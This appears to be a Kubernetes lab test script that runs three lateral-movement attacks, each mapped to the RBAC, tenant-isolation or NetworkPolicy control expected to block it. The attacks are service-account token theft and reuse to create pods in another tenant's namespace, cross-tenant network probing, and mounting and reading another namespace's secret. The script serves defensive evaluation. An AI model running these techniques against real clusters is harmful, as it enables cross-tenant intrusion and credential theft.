#!/usr/bin/env bash
# =============================================================================
# ATTACK A5 — Lateral Movement
# Doc class : A5  |  Script: attack5.sh
# Spec      : Rev5 Section 13
# Objective : pivot from compromised tenant to access another tenant's resources
#
# Techniques (spec-aligned):
#   T1 — SA Token Reuse       tenant-lowpriv token used to schedule pod in
#                             tenant-finserv namespace via API
#   T2 — Network Pivot        direct connection from compromised pod to service
#                             in another tenant namespace
#   T3 — Secret Projection Leak  cross-namespace secret incorrectly projected
#                             into attacker pod and read
#
# Primary defenders:
#   T1 → L3a (RBAC: SA token has no create rights in victim NS) + L4 (tenant isolation)
#   T2 → L5  (NetworkPolicy: default-deny blocks cross-tenant traffic)
#   T3 → L4  (tenant isolation: cross-NS secret projection blocked)
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
#
# REVISION 6: pods this script creates (t1 pivot pod, t3 projection pod) are
# now DIGEST-PINNED (was alpine:3.18 tag) so L1's image-pull digest-pin
# Constraint (controls/c1-l1) doesn't confound A5's own techniques — A5 is
# testing L3a/L4/L5, not L1. Digest resolved via a file-cached lookup so
# repeated trials don't re-pull every time.
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-lowpriv}"
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

# Cached digest resolution — avoids a docker pull/inspect on every single
# trial (this script runs N=50 times per condition).
ALPINE_DIGEST_CACHE="/tmp/zt-lab-alpine-digest.txt"
resolve_alpine_digest() {
  if [[ -s "$ALPINE_DIGEST_CACHE" ]]; then
    cat "$ALPINE_DIGEST_CACHE"
    return
  fi
  local digest=""
  if docker pull alpine:3.18 >/dev/null 2>&1; then
    digest=$(docker inspect --format='{{index .RepoDigests 0}}' alpine:3.18 2>/dev/null || true)
  fi
  [[ -z "$digest" ]] && digest="alpine:3.18"   # fallback — L1 will deny if active
  echo "$digest" > "$ALPINE_DIGEST_CACHE"
  echo "$digest"
}
ALPINE_IMAGE="$(resolve_alpine_digest)"

TECHNIQUES=(t1-sa-token-reuse t2-network-pivot t3-secret-projection-leak)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A5] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"

# Rev6 scope constraint: pivot destination must be a user tenant namespace
# (excluded: node agent compromise, system namespace pod exec, webhook
# processor exhaustion). Every outcome line below records
# pivot_path=user_namespace_only per the brief's explicit recording
# requirement — VICTIM_NS is always one of the four user tenant namespaces
# here, never the system pool, so this holds for all three techniques.
PIVOT_PATH="pivot_path=user_namespace_only"

PIVOT_POD_NAME="a5-pivot-$$"
PROJ_POD_NAME="a5-proj-$$"

cleanup() {
  kubectl delete pod "$PIVOT_POD_NAME" -n "$VICTIM_NS" \
    --ignore-not-found --grace-period=0 2>/dev/null || true
  kubectl delete pod "$PROJ_POD_NAME" -n "$ATTACKER_NS" \
    --ignore-not-found --grace-period=0 2>/dev/null || true
}
trap cleanup EXIT

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)

case "$TECHNIQUE" in

  t1-sa-token-reuse)
    # Use attacker SA token to schedule a pod in the victim namespace via the API
    # This tests whether the SA token grants pod creation rights cross-namespace
    # Success = pod created in victim namespace (lateral movement achieved)
    # Blocked by L3a: RBAC denies pod creation in victim NS
    # Blocked by L4: tenant isolation ResourceQuota/taint prevents scheduling
    echo "[A5-t1] attempting to schedule pod in $VICTIM_NS using $ATTACKER_NS SA token"

    ATTACKER_TOKEN=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true)
    [[ -z "$ATTACKER_TOKEN" ]] && skip "no-attacker-token"
    [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod"

    # Use the attacker SA token to create a pod in the victim namespace
    CREATE_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "curl -sk --max-time 10 \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H 'Authorization: Bearer $ATTACKER_TOKEN' \
        -H 'Content-Type: application/json' \
        -X POST \
        -d '{
          \"apiVersion\": \"v1\",
          \"kind\": \"Pod\",
          \"metadata\": {\"name\": \"$PIVOT_POD_NAME\", \"namespace\": \"$VICTIM_NS\"},
          \"spec\": {
            \"containers\": [{
              \"name\": \"pivot\",
              \"image\": \"$ALPINE_IMAGE\",
              \"command\": [\"sleep\", \"30\"]
            }],
            \"restartPolicy\": \"Never\"
          }
        }' \
        'https://kubernetes.default.svc/api/v1/namespaces/${VICTIM_NS}/pods'" \
      2>/dev/null || echo "")

    echo "[A5-t1] pod create response: $(echo "$CREATE_OUT" | head -c 200)"

    if echo "$CREATE_OUT" | grep -qi "Forbidden\|Unauthorized\|denied\|403\|401"; then
      blocked "t1-sa-token-reuse" "rbac-denied-pod-creation-in-$VICTIM_NS $PIVOT_PATH"
    elif echo "$CREATE_OUT" | grep -qi '"phase"\|"name".*pivot\|"created"'; then
      succeed "t1-sa-token-reuse" "pod-created-in-$VICTIM_NS lateral-movement-success $PIVOT_PATH"
    else
      blocked "t1-sa-token-reuse" "pod-creation-failed response=$(echo "$CREATE_OUT" | head -c 50) $PIVOT_PATH"
    fi
    ;;

  t2-network-pivot)
    # Direct network connection from compromised pod to service in another tenant
    # Tests L5 NetworkPolicy default-deny across tenant boundaries
    # Success = cross-tenant service reachable (NetworkPolicy not enforcing)
    # Blocked by L5: default-deny NetworkPolicy blocks all cross-tenant traffic
    [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

    echo "[A5-t2] direct network pivot $ATTACKER_NS → $VICTIM_NS service"
    VICTIM_SVC_IP=$(kubectl get svc -n "$VICTIM_NS" productpage \
      -o jsonpath='{.spec.clusterIP}' 2>/dev/null || true)
    [[ -z "$VICTIM_SVC_IP" ]] && skip "no-victim-svc"

    # Try both ClusterIP and DNS to confirm NetworkPolicy is the blocker
    SVC_CODE=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
      "http://productpage.${VICTIM_NS}.svc.cluster.local:9080/productpage" \
      2>/dev/null || echo "000")
    echo "[A5-t2] pivot HTTP: $SVC_CODE"

    [[ "$SVC_CODE" =~ ^[2-3][0-9][0-9]$ ]] \
      && succeed "t2-network-pivot" "cross-tenant-reachable http=$SVC_CODE dns=productpage.$VICTIM_NS $PIVOT_PATH" \
      || blocked "t2-network-pivot" "netpol-blocked http=$SVC_CODE $PIVOT_PATH"
    ;;

  t3-secret-projection-leak)
    # Attempt to create a pod in attacker namespace that mounts a secret
    # from the victim namespace via secretRef — tests cross-NS secret projection
    # Success = pod runs and can read victim secret (isolation failure)
    # Blocked by L4: Kubernetes prevents cross-namespace secret references
    echo "[A5-t3] attempting cross-namespace secret projection from $VICTIM_NS into $ATTACKER_NS"

    # First check if a victim secret exists to reference
    VICTIM_SECRET=$(kubectl get secret -n "$VICTIM_NS" \
      --no-headers 2>/dev/null | grep -v "^kubernetes" | head -1 | awk '{print $1}' || true)
    [[ -z "$VICTIM_SECRET" ]] && VICTIM_SECRET="finserv-static-credentials"

    echo "[A5-t3] targeting victim secret: $VICTIM_SECRET in $VICTIM_NS"

    # Attempt pod creation with cross-namespace secret volume
    POD_OUT=$(kubectl apply -f - 2>&1 <<EOF || echo "DENIED"
apiVersion: v1
kind: Pod
metadata:
  name: $PROJ_POD_NAME
  namespace: $ATTACKER_NS
  labels:
    attack-artifact: "true"
spec:
  containers:
  - name: reader
    image: $ALPINE_IMAGE
    command: ["sh", "-c", "cat /victim-secret/* 2>/dev/null && sleep 10 || sleep 10"]
    volumeMounts:
    - name: victim-secret
      mountPath: /victim-secret
  volumes:
  - name: victim-secret
    secret:
      secretName: $VICTIM_SECRET
  restartPolicy: Never
  tolerations:
  - operator: Exists
EOF
)
    echo "[A5-t3] pod apply result: $POD_OUT"

    if echo "$POD_OUT" | grep -qi "denied\|forbidden\|not found\|error"; then
      blocked "t3-secret-projection-leak" "cross-ns-secret-ref-rejected $PIVOT_PATH"
    fi

    # Wait and check if pod actually ran and read the secret
    for i in $(seq 1 10); do
      PHASE=$(kubectl get pod "$PROJ_POD_NAME" -n "$ATTACKER_NS" \
        -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
      [[ "$PHASE" == "Running" || "$PHASE" == "Succeeded" ]] && break
      sleep 1
    done

    PHASE=$(kubectl get pod "$PROJ_POD_NAME" -n "$ATTACKER_NS" \
      -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
    echo "[A5-t3] pod phase: $PHASE"

    if [[ "$PHASE" == "Running" || "$PHASE" == "Succeeded" ]]; then
      SECRET_DATA=$(kubectl logs "$PROJ_POD_NAME" -n "$ATTACKER_NS" 2>/dev/null || echo "")
      [[ -n "$SECRET_DATA" ]] \
        && succeed "t3-secret-projection-leak" "cross-ns-secret-read phase=$PHASE $PIVOT_PATH" \
        || succeed "t3-secret-projection-leak" "pod-ran-with-cross-ns-volume phase=$PHASE $PIVOT_PATH"
    else
      blocked "t3-secret-projection-leak" "pod-failed-or-not-scheduled phase=$PHASE $PIVOT_PATH"
    fi
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
